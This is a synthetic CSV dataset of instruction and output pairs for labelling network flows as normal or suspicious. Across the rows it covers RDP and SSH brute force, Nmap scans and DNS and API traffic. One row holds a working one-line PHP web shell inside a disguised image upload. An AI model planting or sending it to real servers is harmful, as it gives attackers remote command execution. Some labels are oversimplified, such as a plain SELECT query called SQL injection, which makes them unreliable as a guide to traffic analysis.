instruction,input,output
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.1"", ""Destination IP"": ""192.168.1.50"", ""Source Port"": 54000, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.1->192.168.1.50"", ""Timestamp"": ""2024-10-24T16:00:00.123456"", ""Flow Data"": {""packets"": 10, ""bytes"": 2000, ""protocol"": ""TCP""}, ""Payload"": ""GET / HTTP/1.1\r\nHost: internalserver.local""}","{""decision"": ""NORMAL"", ""category"": ""HTTPS Web Traffic"", ""reasons"": [""Internal web server access"", ""Standard HTTPS request"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.33.22.18"", ""Destination IP"": ""192.168.1.70"", ""Source Port"": 62000, ""Destination Port"": 3389, ""Flow Key"": ""185.33.22.18->192.168.1.70"", ""Timestamp"": ""2024-10-24T16:02:00.123456"", ""Flow Data"": {""packets"": 2000, ""bytes"": 150000, ""protocol"": ""TCP""}, ""Payload"": ""RDP connection attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of connection attempts"", ""External IP targeting RDP port"", ""Suspicious packet pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.2"", ""Destination IP"": ""192.168.1.10"", ""Source Port"": 55000, ""Destination Port"": 80, ""Flow Key"": ""192.168.1.2->192.168.1.10"", ""Timestamp"": ""2024-10-24T16:04:00.123456"", ""Flow Data"": {""packets"": 8, ""bytes"": 1200, ""protocol"": ""TCP""}, ""Payload"": ""GET /api/data HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Internal API communication"", ""Standard API request"", ""Expected traffic volume""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.85.24.91"", ""Destination IP"": ""192.168.1.100"", ""Source Port"": 54321, ""Destination Port"": 22, ""Flow Key"": ""103.85.24.91->192.168.1.100"", ""Timestamp"": ""2024-10-24T16:06:00.567890"", ""Flow Data"": {""packets"": 500, ""bytes"": 50000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High packet count"", ""External IP targeting SSH"", ""Brute force attack signature""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.3"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 53000, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.3->8.8.8.8"", ""Timestamp"": ""2024-10-24T16:08:00.123456"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for example.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Known DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.220.100.245"", ""Destination IP"": ""192.168.1.20"", ""Source Port"": 60000, ""Destination Port"": 3306, ""Flow Key"": ""185.220.100.245->192.168.1.20"", ""Timestamp"": ""2024-10-24T16:10:00.345678"", ""Flow Data"": {""packets"": 100, ""bytes"": 10000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT * FROM users;""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SQL Injection"", ""reasons"": [""SQL query pattern detected"", ""External IP accessing database"", ""Known attack vector""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.4"", ""Destination IP"": ""192.168.1.50"", ""Source Port"": 54000, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.4->192.168.1.50"", ""Timestamp"": ""2024-10-24T16:12:00.123456"", ""Flow Data"": {""packets"": 12, ""bytes"": 2000, ""protocol"": ""TCP""}, ""Payload"": ""GET /login HTTP/1.1\r\nHost: internalserver.local""}","{""decision"": ""NORMAL"", ""category"": ""HTTPS Web Traffic"", ""reasons"": [""Internal web traffic"", ""Standard HTTPS request"", ""Valid login request""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.67.89.123"", ""Destination IP"": ""192.168.1.30"", ""Source Port"": 60000, ""Destination Port"": 8080, ""Flow Key"": ""45.67.89.123->192.168.1.30"", ""Timestamp"": ""2024-10-24T16:14:00.345678"", ""Flow Data"": {""packets"": 1000, ""bytes"": 150000, ""protocol"": ""TCP""}, ""Payload"": ""POST /admin HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\""file\""; filename=\""shell.php.jpg\""\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Shell Upload"", ""reasons"": [""PHP code in image file"", ""Targeting admin interface"", ""Command execution payload""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.10"", ""Destination IP"": ""192.168.1.60"", ""Source Port"": 63000, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.10->192.168.1.60"", ""Timestamp"": ""2024-10-24T16:16:00.123456"", ""Flow Data"": {""packets"": 3, ""bytes"": 180, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for internalresource.local""}","{""decision"": ""NORMAL"", ""category"": ""Internal DNS Query"", ""reasons"": [""Internal DNS server"", ""Standard DNS request"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.33.22.18"", ""Destination IP"": ""192.168.1.70"", ""Source Port"": 50000, ""Destination Port"": 3389, ""Flow Key"": ""185.33.22.18->192.168.1.70"", ""Timestamp"": ""2024-10-24T16:18:00.567890"", ""Flow Data"": {""packets"": 1000, ""bytes"": 70000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High number of connection attempts"", ""External IP targeting RDP port"", ""Suspicious traffic volume""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.5"", ""Destination IP"": ""10.0.0.1"", ""Source Port"": 49150, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.5->10.0.0.1"", ""Timestamp"": ""2024-10-24T17:00:00.123456"", ""Flow Data"": {""packets"": 10, ""bytes"": 2500, ""protocol"": ""TCP""}, ""Payload"": ""GET /status HTTP/1.1\r\nHost: api.external.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Standard API request"", ""HTTPS traffic"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.33.22.18"", ""Destination IP"": ""192.168.1.60"", ""Source Port"": 60000, ""Destination Port"": 3389, ""Flow Key"": ""45.33.22.18->192.168.1.60"", ""Timestamp"": ""2024-10-24T17:01:00.123456"", ""Flow Data"": {""packets"": 2000, ""bytes"": 170000, ""protocol"": ""TCP""}, ""Payload"": ""RDP connection attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of RDP requests"", ""External IP"", ""Known brute force pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.20"", ""Destination IP"": ""10.0.0.2"", ""Source Port"": 49200, ""Destination Port"": 22, ""Flow Key"": ""192.168.1.20->10.0.0.2"", ""Timestamp"": ""2024-10-24T17:02:00.234567"", ""Flow Data"": {""packets"": 100, ""bytes"": 8000, ""protocol"": ""TCP""}, ""Payload"": ""SSH login attempt""}","{""decision"": ""NORMAL"", ""category"": ""SSH Login"", ""reasons"": [""Internal IP communication"", ""Valid SSH access"", ""Normal packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.45.12.11"", ""Destination IP"": ""192.168.1.100"", ""Source Port"": 54321, ""Destination Port"": 80, ""Flow Key"": ""103.45.12.11->192.168.1.100"", ""Timestamp"": ""2024-10-24T17:03:00.345678"", ""Flow Data"": {""packets"": 300, ""bytes"": 35000, ""protocol"": ""TCP""}, ""Payload"": ""GET /admin.php HTTP/1.1\r\nUser-Agent: nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Nmap user agent detected"", ""Admin page access"", ""Known scanning pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.50"", ""Destination IP"": ""10.0.0.1"", ""Source Port"": 49500, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.50->10.0.0.1"", ""Timestamp"": ""2024-10-24T17:04:00.456789"", ""Flow Data"": {""packets"": 2, ""bytes"": 150, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for internalapi.local""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Internal DNS request"", ""Standard packet size"", ""Expected response behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.60"", ""Destination IP"": ""192.168.1.10"", ""Source Port"": 49600, ""Destination Port"": 445, ""Flow Key"": ""192.168.1.60->192.168.1.10"", ""Timestamp"": ""2024-10-24T17:05:00.567890"", ""Flow Data"": {""packets"": 1500, ""bytes"": 80000, ""protocol"": ""TCP""}, ""Payload"": ""SMB file share access""}","{""decision"": ""NORMAL"", ""category"": ""SMB Traffic"", ""reasons"": [""Internal network communication"", ""Standard SMB file access"", ""Expected traffic volume""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.44.22.21"", ""Destination IP"": ""192.168.1.20"", ""Source Port"": 56789, ""Destination Port"": 443, ""Flow Key"": ""185.44.22.21->192.168.1.20"", ""Timestamp"": ""2024-10-24T17:06:00.678901"", ""Flow Data"": {""packets"": 1000, ""bytes"": 60000, ""protocol"": ""TCP""}, ""Payload"": ""GET /config HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""SUSPICIOUS"", ""category"": ""API Enumeration"", ""reasons"": [""External IP probing config endpoint"", ""High packet volume"", ""Sensitive API request""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.70"", ""Destination IP"": ""8.8.4.4"", ""Source Port"": 49100, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.70->8.8.4.4"", ""Timestamp"": ""2024-10-24T17:07:00.789012"", ""Flow Data"": {""packets"": 2, ""bytes"": 140, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for google.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS lookup"", ""Google DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""91.204.45.77"", ""Destination IP"": ""192.168.1.30"", ""Source Port"": 49999, ""Destination Port"": 3389, ""Flow Key"": ""91.204.45.77->192.168.1.30"", ""Timestamp"": ""2024-10-24T17:08:00.890123"", ""Flow Data"": {""packets"": 2500, ""bytes"": 200000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of connection attempts"", ""External IP targeting RDP"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.89.67.123"", ""Destination IP"": ""192.168.1.100"", ""Source Port"": 60200, ""Destination Port"": 22, ""Flow Key"": ""45.89.67.123->192.168.1.100"", ""Timestamp"": ""2024-10-24T17:15:00.123456"", ""Flow Data"": {""packets"": 1000, ""bytes"": 75000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High number of connection attempts"", ""External IP targeting SSH port"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.15"", ""Destination IP"": ""10.0.0.2"", ""Source Port"": 44300, ""Destination Port"": 3306, ""Flow Key"": ""192.168.1.15->10.0.0.2"", ""Timestamp"": ""2024-10-24T17:16:00.345678"", ""Flow Data"": {""packets"": 500, ""bytes"": 35000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT * FROM orders WHERE id = 1;""}","{""decision"": ""NORMAL"", ""category"": ""SQL Query"", ""reasons"": [""Internal database query"", ""Expected traffic volume"", ""Valid query structure""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""203.55.123.45"", ""Destination IP"": ""192.168.1.10"", ""Source Port"": 59999, ""Destination Port"": 80, ""Flow Key"": ""203.55.123.45->192.168.1.10"", ""Timestamp"": ""2024-10-24T17:17:00.567890"", ""Flow Data"": {""packets"": 800, ""bytes"": 90000, ""protocol"": ""TCP""}, ""Payload"": ""GET /wp-login.php HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known Nmap scanning pattern"", ""Attempt to access wp-login page"", ""External IP involved""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.50"", ""Destination IP"": ""8.8.4.4"", ""Source Port"": 49001, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.50->8.8.4.4"", ""Timestamp"": ""2024-10-24T17:18:00.678901"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for cloudflare.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Known DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.44.55.12"", ""Destination IP"": ""192.168.1.70"", ""Source Port"": 54321, ""Destination Port"": 22, ""Flow Key"": ""185.44.55.12->192.168.1.70"", ""Timestamp"": ""2024-10-24T17:19:00.789012"", ""Flow Data"": {""packets"": 1200, ""bytes"": 90000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High number of SSH attempts"", ""External IP targeting SSH"", ""Known brute force signature""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.40"", ""Destination IP"": ""10.0.0.3"", ""Source Port"": 54000, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.40->10.0.0.3"", ""Timestamp"": ""2024-10-24T17:20:00.123456"", ""Flow Data"": {""packets"": 10, ""bytes"": 1500, ""protocol"": ""TCP""}, ""Payload"": ""GET /health HTTP/1.1\r\nHost: internal-api.local""}","{""decision"": ""NORMAL"", ""category"": ""API Health Check"", ""reasons"": [""Internal communication"", ""Expected response behavior"", ""Standard health check request""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.45.88.22"", ""Destination IP"": ""192.168.1.80"", ""Source Port"": 61111, ""Destination Port"": 3389, ""Flow Key"": ""103.45.88.22->192.168.1.80"", ""Timestamp"": ""2024-10-24T17:21:00.234567"", ""Flow Data"": {""packets"": 2500, ""bytes"": 200000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of connection attempts"", ""External IP"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.5"", ""Destination IP"": ""10.0.0.5"", ""Source Port"": 44300, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.5->10.0.0.5"", ""Timestamp"": ""2024-10-24T17:22:00.345678"", ""Flow Data"": {""packets"": 8, ""bytes"": 1100, ""protocol"": ""TCP""}, ""Payload"": ""POST /api/data HTTP/1.1\r\nHost: internal-api.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Internal API request"", ""Standard HTTPS request"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""195.55.44.12"", ""Destination IP"": ""192.168.1.60"", ""Source Port"": 53333, ""Destination Port"": 80, ""Flow Key"": ""195.55.44.12->192.168.1.60"", ""Timestamp"": ""2024-10-24T17:23:00.456789"", ""Flow Data"": {""packets"": 700, ""bytes"": 75000, ""protocol"": ""TCP""}, ""Payload"": ""GET /wp-admin HTTP/1.1\r\nUser-Agent: nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known scanning pattern"", ""Admin page access attempt"", ""Nmap user agent detected""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.100"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 49153, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.100->8.8.8.8"", ""Timestamp"": ""2024-10-24T17:24:00.567890"", ""Flow Data"": {""packets"": 2, ""bytes"": 100, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for example.org""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Known DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""203.44.56.12"", ""Destination IP"": ""192.168.1.101"", ""Source Port"": 60000, ""Destination Port"": 22, ""Flow Key"": ""203.44.56.12->192.168.1.101"", ""Timestamp"": ""2024-10-24T17:25:00.123456"", ""Flow Data"": {""packets"": 1500, ""bytes"": 85000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High number of SSH connection attempts"", ""External IP involved"", ""Known brute force pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.25"", ""Destination IP"": ""10.0.0.7"", ""Source Port"": 49300, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.25->10.0.0.7"", ""Timestamp"": ""2024-10-24T17:26:00.234567"", ""Flow Data"": {""packets"": 12, ""bytes"": 2200, ""protocol"": ""TCP""}, ""Payload"": ""GET /api/v2/status HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Valid internal API request"", ""Standard HTTPS communication"", ""Expected payload size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.33.66.22"", ""Destination IP"": ""192.168.1.150"", ""Source Port"": 55555, ""Destination Port"": 80, ""Flow Key"": ""185.33.66.22->192.168.1.150"", ""Timestamp"": ""2024-10-24T17:27:00.345678"", ""Flow Data"": {""packets"": 300, ""bytes"": 45000, ""protocol"": ""TCP""}, ""Payload"": ""GET /admin.php HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known Nmap scanning pattern"", ""Attempt to access admin.php"", ""External IP involved""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.200"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 49154, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.200->8.8.8.8"", ""Timestamp"": ""2024-10-24T17:28:00.456789"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for api.external.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Google DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.22.11.77"", ""Destination IP"": ""192.168.1.65"", ""Source Port"": 54433, ""Destination Port"": 3389, ""Flow Key"": ""103.22.11.77->192.168.1.65"", ""Timestamp"": ""2024-10-24T17:29:00.567890"", ""Flow Data"": {""packets"": 1000, ""bytes"": 80000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High number of connection attempts"", ""External IP targeting RDP"", ""Known brute force pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.210"", ""Destination IP"": ""10.0.0.5"", ""Source Port"": 49500, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.210->10.0.0.5"", ""Timestamp"": ""2024-10-24T17:30:00.123456"", ""Flow Data"": {""packets"": 15, ""bytes"": 3000, ""protocol"": ""TCP""}, ""Payload"": ""GET /health HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Health Check"", ""reasons"": [""Internal API communication"", ""Standard health check request"", ""Expected response behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""193.44.23.12"", ""Destination IP"": ""192.168.1.170"", ""Source Port"": 56789, ""Destination Port"": 80, ""Flow Key"": ""193.44.23.12->192.168.1.170"", ""Timestamp"": ""2024-10-24T17:31:00.234567"", ""Flow Data"": {""packets"": 600, ""bytes"": 70000, ""protocol"": ""TCP""}, ""Payload"": ""GET /wp-login.php HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known scanning behavior"", ""Attempt to access wp-login.php"", ""External IP involved""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.50"", ""Destination IP"": ""8.8.4.4"", ""Source Port"": 49155, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.50->8.8.4.4"", ""Timestamp"": ""2024-10-24T17:32:00.345678"", ""Flow Data"": {""packets"": 2, ""bytes"": 140, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for google.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS lookup"", ""Known DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.230"", ""Destination IP"": ""10.0.0.3"", ""Source Port"": 64100, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.230->10.0.0.3"", ""Timestamp"": ""2024-10-24T17:33:00.456789"", ""Flow Data"": {""packets"": 20, ""bytes"": 4000, ""protocol"": ""TCP""}, ""Payload"": ""GET /status HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Internal API health check"", ""Expected packet size"", ""Standard HTTPS request""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.23.12.56"", ""Destination IP"": ""192.168.1.60"", ""Source Port"": 51234, ""Destination Port"": 3389, ""Flow Key"": ""185.23.12.56->192.168.1.60"", ""Timestamp"": ""2024-10-24T17:34:00.567890"", ""Flow Data"": {""packets"": 1500, ""bytes"": 120000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High number of connection attempts"", ""External IP targeting RDP"", ""Known brute force signature""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""194.55.34.22"", ""Destination IP"": ""192.168.1.120"", ""Source Port"": 60001, ""Destination Port"": 22, ""Flow Key"": ""194.55.34.22->192.168.1.120"", ""Timestamp"": ""2024-10-24T17:35:00.123456"", ""Flow Data"": {""packets"": 1200, ""bytes"": 85000, ""protocol"": ""TCP""}, ""Payload"": ""SSH brute force attack""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SSH Brute Force"", ""reasons"": [""High number of connection attempts"", ""External IP targeting SSH"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.30"", ""Destination IP"": ""10.0.0.8"", ""Source Port"": 44300, ""Destination Port"": 3306, ""Flow Key"": ""192.168.1.30->10.0.0.8"", ""Timestamp"": ""2024-10-24T17:36:00.234567"", ""Flow Data"": {""packets"": 10, ""bytes"": 2000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT * FROM orders WHERE status = 'complete';""}","{""decision"": ""NORMAL"", ""category"": ""SQL Query"", ""reasons"": [""Internal database query"", ""Expected traffic volume"", ""Valid query structure""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.45.12.14"", ""Destination IP"": ""192.168.1.80"", ""Source Port"": 59999, ""Destination Port"": 80, ""Flow Key"": ""103.45.12.14->192.168.1.80"", ""Timestamp"": ""2024-10-24T17:37:00.345678"", ""Flow Data"": {""packets"": 500, ""bytes"": 40000, ""protocol"": ""TCP""}, ""Payload"": ""GET /admin.php HTTP/1.1\r\nUser-Agent: Nmap""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scan"", ""reasons"": [""Known Nmap scanning pattern"", ""Attempt to access admin.php"", ""External IP involved""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.200"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 49156, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.200->8.8.8.8"", ""Timestamp"": ""2024-10-24T17:38:00.456789"", ""Flow Data"": {""packets"": 2, ""bytes"": 150, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for docs.example.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS request"", ""Google DNS server"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.22.11.45"", ""Destination IP"": ""192.168.1.200"", ""Source Port"": ""54123"", ""Destination Port"": 3389, ""Flow Key"": ""185.22.11.45->192.168.1.200"", ""Timestamp"": ""2024-10-24T17:39:00.567890"", ""Flow Data"": {""packets"": 1200, ""bytes"": 100000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of RDP attempts"", ""External IP involved"", ""Known brute force behavior""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.40"", ""Destination IP"": ""10.0.0.5"", ""Source Port"": 50000, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.40->10.0.0.5"", ""Timestamp"": ""2024-10-24T17:40:00.678901"", ""Flow Data"": {""packets"": 8, ""bytes"": 1200, ""protocol"": ""TCP""}, ""Payload"": ""GET /health HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Health Check"", ""reasons"": [""Internal API communication"", ""Standard health check"", ""Expected traffic volume""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.12.77.11"", ""Destination IP"": ""192.168.1.110"", ""Source Port"": 60123, ""Destination Port"": 3389, ""Flow Key"": ""103.12.77.11->192.168.1.110"", ""Timestamp"": ""2024-10-24T17:41:00.789012"", ""Flow Data"": {""packets"": 1500, ""bytes"": 110000, ""protocol"": ""TCP""}, ""Payload"": ""RDP brute force attempt""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RDP Brute Force"", ""reasons"": [""High volume of connection attempts"", ""External IP involved"", ""Known brute force pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.60"", ""Destination IP"": ""10.0.0.6"", ""Source Port"": 50200, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.60->10.0.0.6"", ""Timestamp"": ""2024-10-24T17:42:00.890123"", ""Flow Data"": {""packets"": 10, ""bytes"": 1500, ""protocol"": ""TCP""}, ""Payload"": ""POST /api/v2/submit HTTP/1.1\r\nHost: api.internal.local""}","{""decision"": ""NORMAL"", ""category"": ""API Traffic"", ""reasons"": [""Standard API request"", ""Internal network"", ""Expected traffic volume""]}"
